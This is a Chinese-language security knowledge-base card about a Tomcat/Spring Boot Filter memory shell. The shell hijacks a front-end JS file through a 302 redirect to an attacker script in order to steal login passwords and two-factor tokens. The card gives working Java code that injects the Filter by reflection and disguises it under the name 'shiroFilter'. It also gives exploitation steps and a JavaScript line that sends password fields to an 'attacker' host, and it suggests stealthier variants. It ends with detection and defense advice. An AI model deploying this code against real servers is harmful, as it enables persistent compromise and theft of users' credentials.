---
id: web-java-component-tomcat-filter-memshell-js-hijack-credential-theft
title: Tomcat Filter 内存马劫持前端 JS：302 重定向到攻击者脚本，窃取登录明文密码与二因素 token
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-filter-memshell-js-hijack-credential-theft
tags:
- java
- tomcat
- memshell
- filter
- standardcontext
- js-hijack
- credential-theft
- phishing
- spring-boot
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V273
  verified_at: '2026-11-07T23:19:23+08:00'
  notes: 已对照原文核对：Inject.java 反射取 StandardContext、FilterDef/FilterMapBefore/ApplicationFilterConfig+filterConfigs.put 注册、MyFilter 对 app.9fa057ee.js 302 到 attacker JS，以及图 04 的 302 Location、图 05 脚本首行 alert('lufei')、图 06 弹窗均一致。未验证点：原文仅以 alert 证明脚本在目标源执行，未实际抓取明文密码/2FA token（卡已标 confidence=medium）。
url: /docs/web/java/component/tomcat/web-java-component-tomcat-filter-memshell-js-hijack-credential-theft/
draft: false
kb_aliases:
- 内存马窃取明文
- JS 资源劫持
- app.9fa057ee.js 劫持
- Filter 内存马钓鱼
- 前端脚本替换
- jeecg-boot JS 劫持
---

## 一句话结论

已能在 Spring Boot/Tomcat 应用内执行 Java 代码时，可通过 `RequestContextHolder` 拿到 `WebApplicationContext` → `ServletContext` → `ApplicationContext.context` → `StandardContext`，动态注册一个 Filter（`FilterDef` + `FilterMapBefore` + `ApplicationFilterConfig` 放入 `filterConfigs`）；Filter 命中前端 JS 资源（如 `app.9fa057ee.js`）时返回 302 重定向到攻击者 JS。浏览器对 `<script src>` 的 302 会跟随跳转，并仍在目标站点上下文中执行该脚本，因此攻击者 JS 可读取登录表单的明文账号密码、二因素 token、localStorage 等并外带，实现内存马层面的“窃取明文/钓鱼”。

## 原理

- **StandardContext 的 Filter 容器**：Tomcat 的 `StandardContext` 保存 `filterDefs`、`filterMaps` 和 `filterConfigs`；`ApplicationFilterFactory` 处理请求时按 `filterMaps` 组装 FilterChain，并按名从 `filterConfigs` 取 `ApplicationFilterConfig`。运行期修改这三个结构即可注册新 Filter。
- **从 Spring 上下文拿 StandardContext**：`RequestContextHolder.currentRequestAttributes()` 取当前请求 → `RequestContextUtils.findWebApplicationContext(request)` 取 `WebApplicationContext` → `getServletContext()`；其实现类（`ApplicationContextFacade`）有 `context` 字段指向 `ApplicationContext`，后者又有 `context` 字段指向 `StandardContext`，反射逐层取出。
- **注册方式**：构造 `FilterDef`（设置 Filter 实例、名称、类名）→ `standardContext.addFilterDef`；构造 `FilterMap`（`addURLPattern("/*")`、`setDispatcher("REQUEST")`）→ `addFilterMapBefore`；再 `new ApplicationFilterConfig(standardContext, filterDef)` 并 `filterConfigs.put(name, config)`。直接放入 `filterConfigs` 可使 Filter 立即参与请求链，不依赖 `filterStart()` 的初始化流程（Filter 实例已在注入类中创建）。
- **JS 资源劫持**：Filter 的 `doFilter` 判断 `request.getRequestURI().endsWith("app.9fa057ee.js")`，命中则 `response.sendRedirect("http://attacker/app.js")`，否则 `chain.doFilter`。前端 `<script src="/jeecg-boot/webjars/js/app.9fa057ee.js">` 收到 302 后浏览器会请求攻击者地址，但脚本仍以**包含页面的源**执行——经典 script 标签不受同源策略限制，也不要求 CORS；因此恶意 JS 拥有目标站点的 DOM/存储访问权限。
- **明文窃取**：登录表单在提交前，密码以明文存在于 `<input>` 的 value/事件中；同源 JS 可挂 `submit`/`input` 监听、读取 `document.querySelector` 的字段值、读取 `localStorage/sessionStorage` 中的 token，再 `fetch`/`Image` 外带到攻击者服务器。HttpOnly Cookie 读不到，但页面上可读的密码、验证码、二因素 token 均可截获，且在浏览器端加密/哈希之前。
- **钓鱼扩展**：同一手法可把任意 HTML/JS 资源替换为攻击者版本，弹出伪造登录框或修改页面文案，进一步诱导输入凭据。

## 触发条件

- 攻击者已能在目标 Web 应用内执行 Java 代码（如通过 Attach Agent Jar Loader、反序列化、表达式注入等）。
- 目标为 Spring Boot + 内嵌 Tomcat（`ApplicationContextFacade.context` / `ApplicationContext.context` 反射路径成立）；或已知其它容器的等价 `StandardContext` 获取方式。
- 页面加载一个可预测路径/文件名的 JS 资源，且该请求会经过 Filter 链（`/*` 映射、DispatcherType.REQUEST）。
- 受害者浏览器能访问攻击者 JS 地址；目标未启用会阻止跨源脚本跳转的 CSP（如 `script-src 'self'` 且不允许多源/重定向）。
- 攻击者需要看到用户输入明文密码的时机（登录页、修改密码页）。

## 利用步骤

1. 通过已有 RCE 上传/加载 `Inject` 类，构造 `MyFilter` 并动态注册（`FilterDef`/`FilterMapBefore`/`filterConfigs.put`）。
2. `curl -v http://target/jeecg-boot/webjars/js/app.9fa057ee.js` 验证返回 `302 Location: http://attacker/app.js`。
3. 在攻击者服务器放置恶意 JS（读取表单值/监听提交/外带）。
4. 诱导或等待受害者访问登录页；浏览器加载被劫持 JS，恶意代码在目标源下执行并截获明文凭据/二因素 token。
5. 也可改为直接包装 response 替换 JS 内容（不重定向），隐蔽性更高；或在 Filter 中对登录页 HTML 注入脚本。

## PoC

恶意 Filter：

```java
public class MyFilter implements Filter {
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest r = (HttpServletRequest) req;
        if (r.getRequestURI().endsWith("app.9fa057ee.js")) {
            ((HttpServletResponse) resp).sendRedirect("http://attacker/app.js");
        } else {
            chain.doFilter(req, resp);
        }
    }
}
```

动态注册核心：

```java
WebApplicationContext ctx = RequestContextUtils.findWebApplicationContext(
        ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
ServletContext sc = ctx.getServletContext();
Field f1 = sc.getClass().getDeclaredField("context"); f1.setAccessible(true);
ApplicationContext ac = (ApplicationContext) f1.get(sc);
Field f2 = ac.getClass().getDeclaredField("context"); f2.setAccessible(true);
StandardContext std = (StandardContext) f2.get(ac);

FilterDef def = new FilterDef();
def.setFilter(new MyFilter());
def.setFilterName("shiroFilter");
def.setFilterClass(MyFilter.class.getName());
std.addFilterDef(def);

FilterMap map = new FilterMap();
map.addURLPattern("/*");
map.setFilterName("shiroFilter");
map.setDispatcher(DispatcherType.REQUEST.name());
std.addFilterMapBefore(map);

Map configs = (Map) StandardContext.class.getDeclaredField("filterConfigs").get(std);
Constructor<ApplicationFilterConfig> c = ApplicationFilterConfig.class
        .getDeclaredConstructor(Context.class, FilterDef.class);
c.setAccessible(true);
configs.put("shiroFilter", c.newInstance(std, def));
```

```text
GET /jeecg-boot/webjars/js/app.9fa057ee.js HTTP/1.1
→ HTTP/1.1 302
   Location: http://attacker/app.js
```

恶意 JS（最小示意，实际可读取登录表单/存储并外带）：

```javascript
document.querySelectorAll('input[type=password]').forEach(i =>
    navigator.sendBeacon('http://attacker/c', i.value));
```

文章以 `alert('lufei')` 插入被劫持 JS 头部并成功弹窗，证明脚本在目标页面源下执行。

## 变体与关联

- 不重定向而直接篡改响应体：用 `HttpServletResponseWrapper` 缓冲 JS，替换/前置攻击者代码后写回，避免外部 302 特征。
- 劫持登录页 HTML 注入伪造表单/键盘记录，或将 2FA 页面替换为钓鱼页。
- Filter 注册的其它入口：`StandardContext.addFilterDef/addFilterMapBefore/filterStart`（现有卡），本卡用 `filterConfigs.put(ApplicationFilterConfig)` 直接注册；两者最终都修改同一组 Filter 容器结构。
- 关联：[[web-java-component-tomcat-dynamic-filter-memshell]]（Filter 内存马命令执行）、[[web-java-classloader-agent-httpservlet-jar-loader]]（本卡的 Jar Loader 注入载体）、[[web-java-framework-spring-mvc-dynamic-controller-memshell]]（Controller 内存马）。

## 检测与防御

- 监控 `StandardContext.filterDefs/filterMaps/filterConfigs` 的运行期变更，比对 web.xml 与已注册 Filter 列表；关注新出现的 `/*` Filter 与异常 filterName（如冒用 shiroFilter）。
- 检测前端 JS 资源的 302 跳转到外部域、响应体被改写、静态资源哈希变化；开启 CSP `script-src 'self'` + SRI，禁止脚本跨源重定向执行。
- 登录表单不要在客户端明文处理可被同源脚本读取的敏感值；使用 HttpOnly/Secure Cookie、短期 token、二次校验；对密码字段做防自动读取的 UI 设计只能降低不能消除风险。
- 对运行期 Agent/字节码修改、内存马做基线检测（Arthas/vmtool、类字节码比对、Filter 列表巡检）。
